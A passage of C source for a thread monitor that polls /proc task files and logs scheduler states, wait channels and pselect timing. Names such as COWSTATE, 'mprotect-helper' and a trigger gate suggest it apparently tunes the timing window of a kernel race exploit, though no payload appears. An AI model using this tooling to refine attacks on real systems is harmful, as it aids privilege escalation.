static char readiness_task_state(int fd) {
  char buf[256];
  ssize_t len = pread(fd, buf, sizeof(buf) - 1, 0);
  if (len <= 0)
    return 0;
  buf[len] = '\0';
  char *rparen = strrchr(buf, ')');
  if (!rparen || rparen[1] != ' ' || !rparen[2])
    return 0;
  return rparen[2];
}

#if defined(RMG_DIAG_LIVE_HELPER_SYSCALL_TRACE) && \
    RMG_DIAG_LIVE_HELPER_SYSCALL_TRACE
static void readiness_trace_live_helper_syscall(
    struct readiness_block_monitor *monitor, unsigned long long polls,
    int waiter_stat_fd, const char *trigger) {
  char path[64];
  char syscall_data[256] = {0};
  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall",
           monitor->helper_tid);
  long long at_us = readiness_now_us();
  char waiter_state_before = readiness_task_state(waiter_stat_fd);
  char helper_state_before =
      readiness_task_state(monitor->helper_stat_fd);
  int pselect_active_before = atomic_load_explicit(
      &monitor->pselect_active, memory_order_acquire);
  int syscall_errno = 0;
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    syscall_errno = errno;
  } else {
    ssize_t len = read(fd, syscall_data, sizeof(syscall_data) - 1);
    if (len < 0) {
      syscall_errno = errno;
    } else if (len == 0) {
      syscall_errno = EIO;
    } else {
      for (ssize_t i = 0; i < len; i++) {
        if (syscall_data[i] == '\n' || syscall_data[i] == '\r') {
          syscall_data[i] = '\0';
          break;
        }
      }
    }
    close(fd);
  }
  char helper_state_after =
      readiness_task_state(monitor->helper_stat_fd);
  char waiter_state_after = readiness_task_state(waiter_stat_fd);
  int pselect_active_after = atomic_load_explicit(
      &monitor->pselect_active, memory_order_acquire);
  long long elapsed_us = readiness_now_us() - at_us;
  pr_info("readiness live-D helper syscall trigger=%s "
          "waiter_tid=%d helper_tid=%d polls=%llu "
          "waiter_state_before=%c waiter_state_after=%c "
          "helper_state_before=%c helper_state_after=%c "
          "pselect_active_before=%d pselect_active_after=%d "
          "at_us=%lld elapsed_us=%lld errno=%d data=%s\n",
          trigger, monitor->tid, monitor->helper_tid, polls,
          waiter_state_before ? waiter_state_before : '?',
          waiter_state_after ? waiter_state_after : '?',
          helper_state_before ? helper_state_before : '?',
          helper_state_after ? helper_state_after : '?',
          pselect_active_before, pselect_active_after, at_us, elapsed_us,
          syscall_errno, syscall_data[0] ? syscall_data : "unavailable");
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  char detail[512];
  snprintf(detail, sizeof(detail),
           "trigger=%s,waiter_state_before=%c,waiter_state_after=%c,"
           "helper_state_before=%c,helper_state_after=%c,"
           "pselect_active_before=%d,pselect_active_after=%d,"
           "at_us=%lld,elapsed_us=%lld,errno=%d,data=%s",
           trigger, waiter_state_before ? waiter_state_before : '?',
           waiter_state_after ? waiter_state_after : '?',
           helper_state_before ? helper_state_before : '?',
           helper_state_after ? helper_state_after : '?',
           pselect_active_before, pselect_active_after, at_us, elapsed_us,
           syscall_errno, syscall_data[0] ? syscall_data : "unavailable");
  rmg_diag_checkpoint_text("readiness-live-D-helper-syscall",
                           monitor->helper_tid, polls, detail);
#endif
}
#endif

#if defined(RMG_DIAG_LIVE_HELPER_WCHAN_TRACE) && \
    RMG_DIAG_LIVE_HELPER_WCHAN_TRACE
static void readiness_trace_live_helper_wchan(
    struct readiness_block_monitor *monitor, unsigned long long polls,
    int waiter_stat_fd, unsigned long long d_streak, int gate_before,
    int pselect_active_before) {
  char path[64];
  char wchan[128] = {0};
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan",
           monitor->helper_tid);
  long long at_us = readiness_now_us();
  char helper_state_before =
      readiness_task_state(monitor->helper_stat_fd);
  char waiter_state_before = readiness_task_state(waiter_stat_fd);
  int gate_snapshot_before = atomic_load_explicit(
      &monitor->trigger_gate, memory_order_acquire);
  int pselect_snapshot_before = atomic_load_explicit(
      &monitor->pselect_active, memory_order_acquire);
  int wchan_errno = 0;
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    wchan_errno = errno;
  } else {
    ssize_t len = read(fd, wchan, sizeof(wchan) - 1);
    if (len < 0) {
      wchan_errno = errno;
    } else if (len == 0) {
      wchan_errno = EIO;
    } else {
      for (ssize_t i = 0; i < len; i++) {
        if (wchan[i] == '\n' || wchan[i] == '\r') {
          wchan[i] = '\0';
          break;
        }
      }
    }
    close(fd);
  }
  char helper_state_after =
      readiness_task_state(monitor->helper_stat_fd);
  char waiter_state_after = readiness_task_state(waiter_stat_fd);
  int gate_snapshot_after = atomic_load_explicit(
      &monitor->trigger_gate, memory_order_acquire);
  int pselect_snapshot_after = atomic_load_explicit(
      &monitor->pselect_active, memory_order_acquire);
  long long elapsed_us = readiness_now_us() - at_us;
  pr_info("readiness live-D helper wchan trigger=helper-D "
          "waiter_tid=%d helper_tid=%d polls=%llu d_streak=%llu "
          "trigger_gate=%d pselect_active=%d "
          "helper_state_before=%c helper_state_after=%c "
          "waiter_state_before=%c waiter_state_after=%c "
          "gate_before=%d gate_after=%d "
          "pselect_active_before=%d pselect_active_after=%d "
          "at_us=%lld elapsed_us=%lld errno=%d wchan=%s\n",
          monitor->tid, monitor->helper_tid, polls, d_streak, gate_before,
          pselect_active_before,
          helper_state_before ? helper_state_before : '?',
          helper_state_after ? helper_state_after : '?',
          waiter_state_before ? waiter_state_before : '?',
          waiter_state_after ? waiter_state_after : '?', gate_snapshot_before,
          gate_snapshot_after, pselect_snapshot_before,
          pselect_snapshot_after, at_us, elapsed_us, wchan_errno,
          wchan[0] ? wchan : "unavailable");
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  char detail[512];
  snprintf(detail, sizeof(detail),
           "trigger=helper-D,helper_state_before=%c,helper_state_after=%c,"
           "waiter_state_before=%c,waiter_state_after=%c,"
           "d_streak=%llu,gate_before=%d,gate_after=%d,"
           "pselect_active_before=%d,pselect_active_after=%d,"
           "at_us=%lld,elapsed_us=%lld,errno=%d,wchan=%s",
           helper_state_before ? helper_state_before : '?',
           helper_state_after ? helper_state_after : '?',
           waiter_state_before ? waiter_state_before : '?',
           waiter_state_after ? waiter_state_after : '?', d_streak,
           gate_snapshot_before, gate_snapshot_after, pselect_snapshot_before,
           pselect_snapshot_after, at_us, elapsed_us, wchan_errno,
           wchan[0] ? wchan : "unavailable");
  rmg_diag_checkpoint_text("readiness-live-D-helper-wchan",
                           monitor->helper_tid, polls, detail);
#endif
}
#endif

#if defined(RMG_DIAG_LIVE_WCHAN_TRACE) && RMG_DIAG_LIVE_WCHAN_TRACE
static void readiness_trace_live_d_wchan(
    struct readiness_block_monitor *monitor, char task_state,
    unsigned long long polls, int gate, int runnable_after_gate,
    int pselect_active, int task_stat_fd) {
  char path[64];
  char wchan[128] = {0};
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", monitor->tid);
  long long start_us = readiness_now_us();
  int wchan_errno = 0;
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    wchan_errno = errno;
  } else {
    ssize_t len = read(fd, wchan, sizeof(wchan) - 1);
    if (len < 0) {
      wchan_errno = errno;
    } else if (len == 0) {
      wchan_errno = EIO;
    } else {
      for (ssize_t i = 0; i < len; i++) {
        if (wchan[i] == '\n' || wchan[i] == '\r') {
          wchan[i] = '\0';
          break;
        }
      }
    }
    close(fd);
  }
  int state_after = (int)(unsigned char)readiness_task_state(task_stat_fd);
  int pselect_active_after = atomic_load_explicit(
      &monitor->pselect_active, memory_order_acquire);
  long long elapsed_us = readiness_now_us() - start_us;
  pr_info("readiness live-D wchan tid=%d state_before=%c state_after=%c "
          "polls=%llu gate=%d runnable_after_gate=%d "
          "pselect_active_before=%d pselect_active_after=%d "
          "elapsed_us=%lld wchan_errno=%d wchan=%s\n",
          monitor->tid, task_state,
          state_after ? (char)state_after : '?', polls, gate,
          runnable_after_gate, pselect_active, pselect_active_after,
          elapsed_us, wchan_errno, wchan[0] ? wchan : "unavailable");
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  char detail[288];
  snprintf(detail, sizeof(detail),
           "state_before=%c,state_after=%c,gate=%d,"
           "runnable_after_gate=%d,pselect_active_before=%d,"
           "pselect_active_after=%d,elapsed_us=%lld,wchan_errno=%d,wchan=%s",
           task_state, state_after ? (char)state_after : '?', gate,
           runnable_after_gate, pselect_active, pselect_active_after,
           elapsed_us, wchan_errno, wchan[0] ? wchan : "unavailable");
  rmg_diag_checkpoint_text("readiness-live-D-wchan", monitor->tid, polls,
                           detail);
#endif
#if defined(RMG_DIAG_LIVE_HELPER_SYSCALL_TRACE) && \
    RMG_DIAG_LIVE_HELPER_SYSCALL_TRACE
  if (!monitor->live_d_helper_syscall_captured) {
    monitor->live_d_helper_syscall_captured = 1;
    readiness_trace_live_helper_syscall(monitor, polls, task_stat_fd,
                                        "waiter-D");
  }
#endif
}
#endif

static int readiness_open_task_stat(pid_t tid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/stat", tid);
  return open(path, O_RDONLY | O_CLOEXEC);
}

#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
static int readiness_open_task_schedstat(pid_t tid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/schedstat", tid);
  return open(path, O_RDONLY | O_CLOEXEC);
}

static void readiness_schedstat_record(
    struct readiness_schedstat_trace *trace, int fd, char task_state,
    unsigned long long polls, int pselect_active) {
  if (fd < 0)
    return;

  char buf[128];
  ssize_t len = pread(fd, buf, sizeof(buf) - 1, 0);
  if (len <= 0) {
    trace->read_errors++;
    trace->last_read_errno = len < 0 && errno ? errno : EIO;
    return;
  }
  buf[len] = '\0';

  struct readiness_schedstat_sample sample = {0};
  if (sscanf(buf, "%llu %llu %llu", &sample.runtime_ns,
             &sample.runqueue_wait_ns, &sample.timeslices) != 3) {
    trace->read_errors++;
    trace->last_read_errno = EINVAL;
    return;
  }

  sample.polls = polls;
  sample.at_us = readiness_now_us();
  sample.observer_cpu = sched_getcpu();
  sample.pselect_active = pselect_active;
  sample.task_state = task_state;
  trace->samples++;
  if (trace->stored < READINESS_SCHEDSTAT_TRACE_CAP) {
    trace->events[trace->stored++] = sample;
  } else {
    trace->events[READINESS_SCHEDSTAT_TRACE_CAP - 1] = sample;
    trace->truncated++;
  }
}

static void readiness_schedstat_flush(
    const struct readiness_schedstat_trace *trace, const char *target,
    int tid, int attempt) {
  pr_info("COWSCHED attempt=%d target=%s tid=%d samples=%llu stored=%u "
          "truncated=%u read_errors=%llu open_errno=%d last_read_errno=%d\n",
          attempt, target, tid, trace->samples, trace->stored,
          trace->truncated, trace->read_errors, trace->open_errno,
          trace->last_read_errno);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  char summary[192];
  snprintf(summary, sizeof(summary),
           "target=%s,samples=%llu,stored=%u,truncated=%u,read_errors=%llu,"
           "open_errno=%d,last_read_errno=%d",
           target, trace->samples, trace->stored, trace->truncated,
           trace->read_errors, trace->open_errno, trace->last_read_errno);
  rmg_diag_checkpoint_text("readiness-schedstat-summary", tid, attempt,
                           summary);
#endif
  for (unsigned int i = 0; i < trace->stored; i++) {
    const struct readiness_schedstat_sample *sample = &trace->events[i];
    pr_info("COWSCHED_SAMPLE attempt=%d target=%s tid=%d poll=%llu "
            "state=%c pselect_active=%d at_us=%lld observer_cpu=%d "
            "runtime_ns=%llu runqueue_wait_ns=%llu timeslices=%llu\n",
            attempt, target, tid, sample->polls,
            sample->task_state ? sample->task_state : '?',
            sample->pselect_active, sample->at_us, sample->observer_cpu,
            sample->runtime_ns, sample->runqueue_wait_ns,
            sample->timeslices);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    char detail[224];
    snprintf(detail, sizeof(detail),
             "target=%s,state=%c,pselect_active=%d,at_us=%lld,"
             "observer_cpu=%d,runtime_ns=%llu,runqueue_wait_ns=%llu,"
             "timeslices=%llu",
             target, sample->task_state ? sample->task_state : '?',
             sample->pselect_active, sample->at_us, sample->observer_cpu,
             sample->runtime_ns, sample->runqueue_wait_ns,
             sample->timeslices);
    rmg_diag_checkpoint_text("readiness-schedstat-sample", tid,
                             sample->polls, detail);
#endif
  }
}
#endif

#if defined(RMG_DIAG_READINESS_STATE_TRACE)
static void readiness_monitor_state_mark(
    struct readiness_block_monitor *monitor, int target, int tid, char state,
    unsigned long long polls, int gate, int pselect_active, int observer_cpu,
    long long at_us) {
  int slot = atomic_fetch_add_explicit(&monitor->state_trace_count, 1,
                                       memory_order_relaxed);
  if (slot >= READINESS_MONITOR_STATE_TRACE_CAP)
    return;
  struct readiness_monitor_state_event *entry =
      &monitor->state_trace[slot];
  entry->at_us = at_us;
  entry->polls = polls;
  entry->tid = tid;
  entry->target = target;
  entry->state = (int)(unsigned char)state;
  entry->gate = gate;
  entry->pselect_active = pselect_active;
  entry->observer_cpu = observer_cpu;
}

static void readiness_monitor_state_flush(
    const struct readiness_block_monitor *monitor, int route_attempt) {
  int count = atomic_load_explicit(&monitor->state_trace_count,
                                   memory_order_acquire);
  int truncated = count > READINESS_MONITOR_STATE_TRACE_CAP;
  if (truncated)
    count = READINESS_MONITOR_STATE_TRACE_CAP;
  pr_info("COWSTATE attempt=%d events=%d capacity=%d truncated=%d\n",
          route_attempt, count, READINESS_MONITOR_STATE_TRACE_CAP, truncated);
  for (int i = 0; i < count; i++) {
    const struct readiness_monitor_state_event *entry =
        &monitor->state_trace[i];
    const char *target = entry->target ? "mprotect-helper" : "waiter";
    pr_info("COWSTATE attempt=%d target=%s tid=%d state=%d polls=%llu "
            "gate=%d pselect_active=%d observer_cpu=%d at_us=%lld\n",
            route_attempt, target, entry->tid, entry->state, entry->polls,
            entry->gate, entry->pselect_active, entry->observer_cpu,
            entry->at_us);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    char detail[192];
    snprintf(detail, sizeof(detail),
             "target=%s,state=%d,polls=%llu,gate=%d,pselect_active=%d,"
             "observer_cpu=%d",
             target, entry->state, entry->polls, entry->gate,
             entry->pselect_active, entry->observer_cpu);
    rmg_diag_checkpoint_text("readiness-monitor-state", entry->tid,
                             (unsigned long long)entry->at_us, detail);
#endif
  }
}
#endif

#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
static int readiness_capture_task_wchan(pid_t tid, char *buf,
                                        size_t buf_size) {
  if (!buf || buf_size < 2)
    return EINVAL;
  buf[0] = '\0';
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return errno;
  ssize_t len = read(fd, buf, buf_size - 1);
  int read_errno = len < 0 ? errno : 0;
  close(fd);
  if (len < 0)
    return read_errno;
  buf[len] = '\0';
  for (ssize_t i = 0; i < len; i++) {
    if (buf[i] == '\n' || buf[i] == '\r') {
      buf[i] = '\0';
      break;
    }
  }
  return 0;
}

static void readiness_record_block_sample(
    struct readiness_block_monitor *monitor, char task_state,
    unsigned long long polls, int gate, int runnable_after_gate,
    int pselect_active, int task_stat_fd) {
  monitor->block_seen = 1;
  monitor->block_state = (int)(unsigned char)task_state;
  monitor->block_gate = gate;
  monitor->block_runnable_after_gate = runnable_after_gate;
  monitor->block_pselect_started =
      atomic_load_explicit(&monitor->pselect_call_started,
                           memory_order_acquire);
  monitor->block_pselect_active_at_state = pselect_active;
  monitor->block_polls = polls;
  monitor->block_at_us = readiness_now_us();
  /* Preserve the state sample before doing any optional procfs work. The
   * wchan read can outlast the pselect window and must not classify this
   * sample or delay the monitor's active-window check. */
  monitor->block_pselect_active_after_state = atomic_load_explicit(
      &monitor->pselect_active, memory_order_acquire);
  monitor->block_pselect_active_after_wchan = -1;
  monitor->block_wchan_errno = -1;
  monitor->block_wchan_state_after = -1;
  monitor->block_wchan_elapsed_us = -1;
  monitor->block_wchan[0] = '\0';
  long long wchan_start_us = readiness_now_us();
  monitor->block_wchan_errno = readiness_capture_task_wchan(
      monitor->tid, monitor->block_wchan, sizeof(monitor->block_wchan));
  monitor->block_wchan_state_after = (int)(unsigned char)
      readiness_task_state(task_stat_fd);
  monitor->block_pselect_active_after_wchan = atomic_load_explicit(
      &monitor->pselect_active, memory_order_acquire);
  monitor->block_wchan_elapsed_us = readiness_now_us() - wchan_start_us;
}

static void readiness_log_block_wchan_snapshot(
    struct readiness_block_monitor *monitor) {
  if (!monitor->block_seen)
    return;
  pr_info("readiness monitor block snapshot tid=%d "
          "state_before_wchan=%d state_after_wchan=%d polls=%llu "
          "at_us=%lld gate=%d runnable_after_gate=%d runnable_poll=%llu "
          "pselect_started=%d pselect_active_state=%d/%d "
          "wchan_capture=live-first-D wchan_elapsed_us=%lld "
          "pselect_active_after_wchan=%d "
          "wchan_errno=%d wchan=%s\n",
          monitor->tid, monitor->block_state,
          monitor->block_wchan_state_after, monitor->block_polls,
          monitor->block_at_us,
          monitor->block_gate, monitor->block_runnable_after_gate,
          monitor->runnable_after_gate_polls,
          monitor->block_pselect_started,
          monitor->block_pselect_active_at_state,
          monitor->block_pselect_active_after_state,
          monitor->block_wchan_elapsed_us,
          monitor->block_pselect_active_after_wchan,
          monitor->block_wchan_errno,
          monitor->block_wchan[0] ? monitor->block_wchan : "unavailable");
}

static void readiness_record_locker_block_sample(
    struct readiness_block_monitor *monitor, char task_state,
    unsigned long long polls, int gate, int pselect_active) {
  if (monitor->locker_block_seen)
    return;
  monitor->locker_block_seen = 1;
  monitor->locker_block_state = (int)(unsigned char)task_state;
  monitor->locker_block_gate = gate;
  monitor->locker_block_pselect_active = pselect_active;
  monitor->locker_block_polls = polls;
  monitor->locker_block_at_us = readiness_now_us();
  monitor->locker_block_wchan_errno = -1;
  monitor->locker_block_wchan[0] = '\0';
  /* Read the wait channel while this TID is still present and in D state.
   * Keep the result in memory so logging cannot extend the observed window. */
  monitor->locker_block_wchan_errno = readiness_capture_task_wchan(
      atomic_load_explicit(&monitor->locker_tid, memory_order_acquire),
      monitor->locker_block_wchan, sizeof(monitor->locker_block_wchan));
}

static void readiness_log_locker_block_wchan_snapshot(
    struct readiness_block_monitor *monitor) {
  if (!monitor->locker_block_seen)
    return;
  pr_info("readiness monitor mprotect-helper block snapshot tid=%d "
          "state=%d polls=%llu at_us=%lld gate=%d pselect_active=%d "
          "wchan_capture=live-first-D "
          "wchan_errno=%d wchan=%s\n",
          atomic_load_explicit(&monitor->locker_tid, memory_order_acquire),
          monitor->locker_block_state, monitor->locker_block_polls,
          monitor->locker_block_at_us, monitor->locker_block_gate,
          monitor->locker_block_pselect_active,
          monitor->locker_block_wchan_errno,
          monitor->locker_block_wchan[0] ? monitor->locker_block_wchan
                                         : "unavailable");
}

#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
static void readiness_checkpoint_locker_block_sample(
    const struct readiness_block_monitor *monitor) {
  char detail[256];
  snprintf(detail, sizeof(detail),
           "state=%d,at_us=%lld,gate=%d,pselect_active=%d,"
           "wchan_capture=live-first-D,wchan_errno=%d,wchan=%s",
           monitor->locker_block_state, monitor->locker_block_at_us,
           monitor->locker_block_gate, monitor->locker_block_pselect_active,
           monitor->locker_block_wchan_errno,
           monitor->locker_block_wchan[0] ? monitor->locker_block_wchan
                                          : "unavailable");
  if (monitor->locker_block_seen)
    rmg_diag_checkpoint_text("readiness-monitor-locker-block",
                             atomic_load_explicit(&monitor->locker_tid,
                                                  memory_order_acquire),
                             monitor->locker_block_polls, detail);
  snprintf(detail, sizeof(detail),
           "open_errno=%d,polls=%llu,blocked_samples=%llu,first_state=%d,last_state=%d",
           monitor->locker_open_errno, monitor->locker_polls,
           monitor->locker_blocked_samples, monitor->locker_first_state,
           monitor->locker_last_state);
  rmg_diag_checkpoint_text("readiness-monitor-locker-summary",
                           atomic_load_explicit(&monitor->locker_tid,
                                                memory_order_acquire),
                           monitor->locker_polls, detail);
}
#endif

static void readiness_log_locker_monitor_summary(
    const struct readiness_block_monitor *monitor) {
  pr_info("readiness mprotect-helper monitor tid=%d open_errno=%d "
          "polls=%llu blocked_samples=%llu first_state=%d last_state=%d "
          "block_seen=%d block_state=%d block_at_us=%lld "
          "wchan_errno=%d wchan=%s\n",
          atomic_load_explicit(&monitor->locker_tid, memory_order_acquire),
          monitor->locker_open_errno, monitor->locker_polls,
          monitor->locker_blocked_samples, monitor->locker_first_state,
          monitor->locker_last_state, monitor->locker_block_seen,
          monitor->locker_block_state, monitor->locker_block_at_us,
          monitor->locker_block_wchan_errno,
          monitor->locker_block_wchan[0] ? monitor->locker_block_wchan
                                         : "unavailable");
}

#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
static void readiness_checkpoint_block_sample(
    const struct readiness_block_monitor *monitor) {
  if (!monitor->block_seen)
    return;
  const char *stage = !monitor->block_gate
                          ? "readiness-monitor-pre-gate-block"
                          : ((!monitor->block_pselect_active_at_state ||
                              !monitor->block_pselect_active_after_state)
                                 ? "readiness-monitor-block-state-outside-pselect"
                                 : (!monitor->block_runnable_after_gate
                                        ? "readiness-monitor-block-state-before-runnable"
                                        : "readiness-monitor-block-state-during-pselect"));
  char detail[384];
  snprintf(detail, sizeof(detail),
           "state_before_wchan=%d,state_after_wchan=%d,gate=%d,"
           "runnable_after_gate=%d,runnable_poll=%llu,"
           "pselect_started=%d,pselect_active_at_state=%d,"
           "pselect_active_after_state=%d,wchan_capture=live-first-D,"
           "wchan_elapsed_us=%lld,pselect_active_after_wchan=%d,"
           "wchan_errno=%d,wchan=%s,"
           "first_state=%d",
           monitor->block_state, monitor->block_wchan_state_after,
           monitor->block_gate,
           monitor->block_runnable_after_gate,
           monitor->runnable_after_gate_polls,
           monitor->block_pselect_started,
           monitor->block_pselect_active_at_state,
           monitor->block_pselect_active_after_state,
           monitor->block_wchan_elapsed_us,
           monitor->block_pselect_active_after_wchan,
           monitor->block_wchan_errno,
           monitor->block_wchan[0] ? monitor->block_wchan : "unavailable",
           monitor->first_state);
  rmg_diag_checkpoint_text(stage, monitor->tid, monitor->block_polls,
                           detail);
}
#endif
#else
static void readiness_log_task_wchan(pid_t tid) {
  char path[64];
  char buf[128];
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_info("readiness monitor wchan tid=%d monitor_tid=%ld open_errno=%d\n",
            tid, syscall(SYS_gettid), errno);
    return;
  }
  ssize_t len = read(fd, buf, sizeof(buf) - 1);
  int read_errno = errno;
  close(fd);
  if (len < 0) {
    pr_info("readiness monitor wchan tid=%d monitor_tid=%ld read_errno=%d\n",
            tid, syscall(SYS_gettid), read_errno);
    return;
  }
  buf[len] = '\0';
  for (ssize_t i = 0; i < len; i++) {
    if (buf[i] == '\n' || buf[i] == '\r') {
      buf[i] = '\0';
      break;
    }
  }
  pr_info("readiness monitor wchan tid=%d monitor_tid=%ld value=%s\n",
          tid, syscall(SYS_gettid), buf);
}
#endif

static void *readiness_block_monitor_thread(void *arg) {
  struct readiness_block_monitor *monitor = arg;
  disable_rseq_for_thread();
#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
  int waiter_schedstat_fd = -1;
#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
  int helper_schedstat_fd = -1;
#endif
#endif

#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
  int waiter_core = atomic_load_explicit(&route_waiter_core,
                                         memory_order_acquire);
  if (readiness_pin_passive_observer(
          waiter_core, &monitor->observer_core, &monitor->helper_core,
          &monitor->observer_inherited_affinity,
          &monitor->observer_allowed_affinity,
          &monitor->observer_effective_affinity) != 0) {
    monitor->observer_affinity_errno = errno ? errno : EINVAL;
    pr_error("readiness passive monitor affinity failed waiter_core=%d "
             "errno=%d\n",
             waiter_core, monitor->observer_affinity_errno);
    atomic_store_explicit(&monitor->ready, 1, memory_order_release);
    return NULL;
  }
  pr_info("readiness passive monitor affinity inherited=%016llx "
          "allowed=%016llx helper_core=%d effective=%016llx "
          "observer_core=%d sched_cpu=%d waiter_core=%d\n",
          monitor->observer_inherited_affinity,
          monitor->observer_allowed_affinity, monitor->helper_core,
          monitor->observer_effective_affinity, monitor->observer_core,
          sched_getcpu(), waiter_core);
#endif

#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("readiness-monitor-thread-start", monitor->tid,
                      monitor->seq);
#endif
  int fd = readiness_open_task_stat(monitor->tid);
  if (fd < 0) {
    monitor->open_errno = errno;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("readiness-monitor-open-failed", monitor->tid,
                        monitor->open_errno);
#endif
    atomic_store_explicit(&monitor->ready, 1, memory_order_release);
    return NULL;
  }
#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
  waiter_schedstat_fd = readiness_open_task_schedstat(monitor->tid);
  if (waiter_schedstat_fd < 0)
    monitor->waiter_schedstat.open_errno = errno;
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("readiness-monitor-open", monitor->tid, fd);
#endif
  atomic_store_explicit(&monitor->ready, 1, memory_order_release);

#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
  while (!atomic_load_explicit(&monitor->helper_stat_ready,
                               memory_order_acquire) &&
         !atomic_load_explicit(&monitor->stop, memory_order_acquire))
    __asm__ volatile("yield" ::: "memory");
  if (atomic_load_explicit(&monitor->stop, memory_order_acquire)) {
    close(fd);
#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
    if (waiter_schedstat_fd >= 0)
      close(waiter_schedstat_fd);
#endif
    return NULL;
  }
  int helper_fd = monitor->helper_stat_fd;
#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
  helper_schedstat_fd = readiness_open_task_schedstat(monitor->helper_tid);
  if (helper_schedstat_fd < 0)
    monitor->helper_schedstat.open_errno = errno;
#endif
#endif

#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
  while (!atomic_load_explicit(&monitor->locker_stat_ready,
                               memory_order_acquire) &&
         !atomic_load_explicit(&monitor->stop, memory_order_acquire))
    __asm__ volatile("yield" ::: "memory");
  if (atomic_load_explicit(&monitor->stop, memory_order_acquire)) {
    close(fd);
#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
    if (waiter_schedstat_fd >= 0)
      close(waiter_schedstat_fd);
    if (helper_schedstat_fd >= 0)
      close(helper_schedstat_fd);
#endif
    return NULL;
  }
  int locker_fd = monitor->locker_stat_fd;
#endif

  unsigned long long polls = 0;
  unsigned long long blocked_samples = 0;
  int first_state = 0;
  int last_state = 0;
  int armed_logged = 0;
#if defined(RMG_DIAG_LIVE_HELPER_WCHAN_TRACE) && \
    RMG_DIAG_LIVE_HELPER_WCHAN_TRACE
  unsigned long long helper_d_streak = 0;
#endif
  while (!atomic_load_explicit(&monitor->stop, memory_order_acquire)) {
    if (!atomic_load_explicit(&monitor->armed, memory_order_acquire)) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    if (!armed_logged) {
      armed_logged = 1;
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
      readiness_trace_mark(READINESS_TRACE_MONITOR_ARMED, 0);
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("readiness-monitor-armed", monitor->tid,
                          monitor->seq);
#endif
    }
#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
    int passive_sample_due = ((polls + 1) % 4) == 0;
    int passive_gate_before = 0;
    int passive_active_before = 0;
    if (passive_sample_due) {
      passive_gate_before = atomic_load_explicit(&monitor->trigger_gate,
                                                 memory_order_acquire);
      passive_active_before = atomic_load_explicit(&monitor->pselect_active,
                                                   memory_order_acquire);
    }
#endif
#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
    int schedstat_active_before = atomic_load_explicit(
        &monitor->pselect_active, memory_order_acquire);
#endif
    char task_state = readiness_task_state(fd);
#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
    int schedstat_active_after = atomic_load_explicit(
        &monitor->pselect_active, memory_order_acquire);
#endif
    if (atomic_load_explicit(&monitor->stop, memory_order_acquire))
      break;
#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
    long long passive_sample_at_us = passive_sample_due
        ? readiness_now_us() : 0;
    int passive_gate_after = passive_sample_due
        ? atomic_load_explicit(&monitor->trigger_gate, memory_order_acquire)
        : 0;
    int passive_active_after = passive_sample_due
        ? atomic_load_explicit(&monitor->pselect_active, memory_order_acquire)
        : 0;
#endif
#if defined(RMG_DIAG_READINESS_STATE_TRACE) || \
    (defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE)
    int previous_state = last_state;
#endif
    polls++;
    last_state = (int)(unsigned char)task_state;
    if (polls == 1)
      first_state = last_state;
#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
    int waiter_state_changed =
